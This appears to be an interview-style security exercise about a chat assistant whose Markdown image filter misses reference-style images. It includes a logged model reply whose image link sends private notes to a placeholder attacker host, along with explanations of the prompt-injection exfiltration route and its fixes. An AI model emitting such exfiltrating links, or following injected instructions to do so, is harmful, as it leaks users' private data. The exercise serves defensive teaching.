## Question

<Callout kind="interview" label="Debug round">
A chat assistant renders Markdown. After a report, the team added a filter that removes images not hosted on the company CDN. A week later the security team sees a request from a user's browser to an unknown host, carrying text from the user's private notes in its query string. Find the gap.
</Callout>

The filter, applied to every model reply before rendering:

```python
import re
from urllib.parse import urlparse

ALLOWED = {"cdn.example.com"}
INLINE_IMG = re.compile(r"!\[[^\]]*\]\(\s*([^)\s]+)[^)]*\)")

def filter_images(markdown):
    def check(m):
        host = urlparse(m.group(1)).hostname
        return m.group(0) if host in ALLOWED else "[image removed]"
    return INLINE_IMG.sub(check, markdown)
```

The logged reply that caused the fetch (the attacker host is a placeholder):

```text
Here is the summary you asked for.

![chart][r1]

[r1]: https://collector.attacker.example/c.png?n=renewal%20terms%20...
```

The page has no Content Security Policy for images.

## Hints

<details class="hint"><summary>Hint 1</summary><p>Run the regex in your head against the reply. Which line does it match?</p></details>
<details class="hint"><summary>Hint 2</summary><p>Markdown has more than one syntax for images.</p></details>

## Answer

The filter only knows inline image syntax, `![alt](url)`. Markdown also has reference-style images: `![alt][id]` in the text and `[id]: url` on its own line. The regex never matches either line, so the reply passes untouched and the renderer turns it into an ordinary image request, query string and all. EchoLeak used reference-style Markdown for exactly this reason: the redaction step it bypassed looked for inline links.

The fix has layers. Parse the Markdown with the same library the renderer uses and filter image nodes in the parsed tree, so every syntax the renderer understands is covered. Add a Content Security Policy with an `img-src` that lists only hosts you control, so the browser refuses the fetch whatever the filter misses. And consider not rendering model-written images at all in contexts where the model has read untrusted text.

Why the wrong picks are tempting. Case-folding bugs are a classic allowlist failure, but `urlparse` returns a lower-case hostname. Encoded query strings look suspicious, but the check is on the host. The allowlisted-CDN redirect is a real attack class and the reason the CSP matters, but this fetch did not go through the CDN.

## Follow-ups

- *Is a CSP enough on its own?* It stops the browser fetch. It does not stop the model writing a clickable link with the data in it, so links from model output also need their real destination shown.
- *Where did the instruction to write that image come from?* Probably from a note or document the model read. Fixing the output channel does not remove the injection; it removes one way out.

## Common mistakes

- Patching the regex to also match `[id]: url` lines and stopping there. The next syntax (HTML `<img>`, autolinks) needs another patch; parse instead.
- Allowlisting a broad domain such as a whole cloud storage service, which anyone can host files on.
- Treating the bug as a model failure. The model wrote text; the renderer turned it into a network request.
